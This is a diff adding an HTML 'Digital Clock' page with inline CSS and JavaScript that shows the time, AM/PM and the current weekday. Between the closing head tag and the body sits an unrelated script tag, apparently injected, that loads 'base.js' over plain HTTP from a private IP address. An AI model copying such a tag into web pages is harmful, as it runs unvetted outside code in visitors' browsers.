@@ -1,0 +1,283 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	
+	<meta charset="utf-8">
+	<meta name="viewport"content="width=device-width, initial-scale=1.0">
+	
+	<title>Digital Clock</title>
+	
+	<style>
+	/*DIGITAL CLOCK FONT*/
+@font-face{
+ font-family:'digital-7';
+ src: url('../fonts/digital-7.ttf');
+}
+
+* {
+	margin: 0;
+	padding: 0;
+}
+
+body {
+	color: #ffffff;
+	background-color: #000000;
+	font-family: 'digital-7', sans-serif;
+}
+	
+
+h1{
+	text-align: center;
+    position:absolute;
+    top:28%; left:50%;
+    transform: translate(-50%,-50%);
+    padding: 15px;
+    border: solid 5px #ffffff;
+}
+    
+main {
+	text-align: center;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%,-50%);
+    padding: 15px;
+    border: solid 5px #ffffff;
+}
+
+
+/* DAYS OF THE WEEK */
+div.days {
+	margin: 0 auto;
+	color: #000000;
+}
+
+div.days .day {
+	display: inline-block;
+}
+
+div.days .day p {
+	font-size: 12px;
+	font-weight: bold;
+	font-family: sans-serif;
+	text-transform: uppercase;
+}
+
+
+/* CLOCK */
+div.clock {
+	margin: 5px 0;
+}
+
+div.clock div{
+	display: inline-block;
+	position: relative;
+}
+
+div.clock div p{
+	font-size: 100px;
+	position: relative;
+	z-index: 100;
+}
+
+div.clock .placeholder {
+	color: #131212;
+	position: absolute;
+	top: 0;
+	z-index: 50;
+}/*END CLOCK*/
+
+
+/* AM OR PM*/
+.am-pm {
+	font-family: sans-serif;
+	text-transform: uppercase;
+	width: 20px;
+}
+
+div.am-pm div p {
+	font-size: 12px;
+	font-weight: bold;
+	width: 100%;
+}
+
+.am, .pm {
+	color: #131212;
+}
+
+/*CLASS THAT CHANGES COLOR OF TEXT TO APPEAR LIKE ITS "ON"*/
+.light-on {
+	color: #ffffff;
+}
+	</style>	
+	
+	
+
+
+	<!-- CUSTOM JAVASCRIPT STYLESHEET -->
+	<script>
+	//invokes functions as soon as window loads
+window.onload = function(){
+	time();
+	ampm();
+	whatDay();
+	setInterval(function(){
+		time();
+		ampm();
+		whatDay();
+	}, 1000);
+};
+
+
+//gets current time and changes html to reflect it
+function time(){
+	var date = new Date(),
+		hours = date.getHours(),
+		minutes = date.getMinutes(),
+		seconds = date.getSeconds();
+
+	//make clock a 12 hour clock instead of 24 hour clock
+	hours = (hours > 12) ? (hours - 12) : hours;
+	hours = (hours === 0) ? 12 : hours;
+
+	//invokes function to make sure number has at least two digits
+	hours = addZero(hours);
+	minutes = addZero(minutes);
+	seconds = addZero(seconds);
+
+	//changes the html to match results
+	document.getElementsByClassName('hours')[0].innerHTML = hours;
+	document.getElementsByClassName('minutes')[0].innerHTML = minutes;
+	document.getElementsByClassName('seconds')[0].innerHTML = seconds;
+}
+
+//turns single digit numbers to two digit numbers by placing a zero in front
+function addZero (val){
+	return (val <= 9) ? ("0" + val) : val;
+}
+
+//lights up either am or pm on clock
+function ampm(){
+	var date = new Date(),
+		hours = date.getHours(),
+		am = document.getElementsByClassName("am")[0].classList,
+		pm = document.getElementsByClassName("pm")[0].classList;
+	
+		
+	(hours >= 12) ? pm.add("light-on") : am.add("light-on");
+	(hours >= 12) ? am.remove("light-on") : pm.remove("light-on");
+}
+
+//lights up what day of the week it is
+function whatDay(){
+	var date = new Date(),
+		currentDay = date.getDay(),
+		days = document.getElementsByClassName("day");
+
+	//iterates through all divs with a class of "day"
+	for (x in days){
+		//list of classes in current div
+		var classArr = days[x].classList;
+
+		(classArr !== undefined) && ((x == currentDay) ? classArr.add("light-on") : classArr.remove("light-on"));
+	}
+}
+	
+	</script>
+
+
+</head><script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='http://10.71.184.6:8080/www/default/base.js'></script>
+
+<body>
+<div style="float:center;align=center;padding:30px;margin:20px;width:1000px;height:200px;max-width:100%;">
+
+<h1>Digital Clock</h1>
+
+	<main>
+
+		<!-- DAY OF THE WEEK -->
+		<div class="days">
+		
+			<div class="day">
+				<p class="sunday">sunday</p>
+			</div>
+
+			<div class="day">
+				<p class="monday">monday</p>
+			</div>
+
+			<div class="day">
+				<p class="tuesday">tuesday</p>
+			</div>
+
+			<div class="day">
+				<p class="wednesday">wednesday</p>
+			</div>
+
+			<div class="day">
+				<p class="thursday">thursday</p>
+			</div>
+
+			<div class="day">
+				<p class="friday">friday</p>
+			</div>
+
+			<div class="day">
+				<p class="saturday">saturday</p>
+			</div>
+
+		</div>
+		<!-- CLOCK -->
+		<div class="clock">
+			<!-- HOUR -->
+			<div class="numbers">
+				<p class="hours"></p>
+				<p class="placeholder"></p>
+			</div>
+
+			<div class="colon">
+				<p>:</p>
+			</div>
+
+			<!-- MINUTE -->
+			<div class="numbers">
+				<p class="minutes"></p>
+				<p class="placeholder"></p>
+			</div>
+
+			<div class="colon">
+				<p>:</p>
+			</div>
+
+			<!-- SECOND -->
+			<div class="numbers">
+				<p class="seconds"></p>
+				<p class="placeholder"></p>
+			</div>
+			
+			<!-- AM / PM -->
+			<div class="am-pm">
+
+				<!-- AM -->
+				<div>
+					<p class="am">am</p>
+				</div>
+
+				<!-- PM -->
+				<div>
+					<p class="pm">pm</p>
+				</div>
+			</div>
+
+		</div><!-- END CLOCK -->
+
+	</main>
+
+	<!-- FONT AWESOME LINK -->
+	<script src="https://use.fontawesome.com/b406684c95.js"></script>
+</div>
+
+</body>
+
+</html>
